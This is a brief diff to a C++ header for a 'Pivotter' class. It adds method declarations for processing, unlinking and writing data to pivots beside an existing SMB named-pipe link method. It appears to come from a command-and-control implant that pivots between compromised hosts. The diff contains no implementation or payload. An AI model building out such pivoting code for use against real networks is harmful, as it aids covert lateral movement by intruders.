@@ -21,5 +21,9 @@ class Pivotter
 public:
 	Vector<PivotData> pivots;
 
+	void ProcessPivots(Packer* packer);
+
 	void LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker);
+	void UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer* outPacker);
+	void WritePivot(ULONG pivotId, BYTE* data, ULONG size);
 };
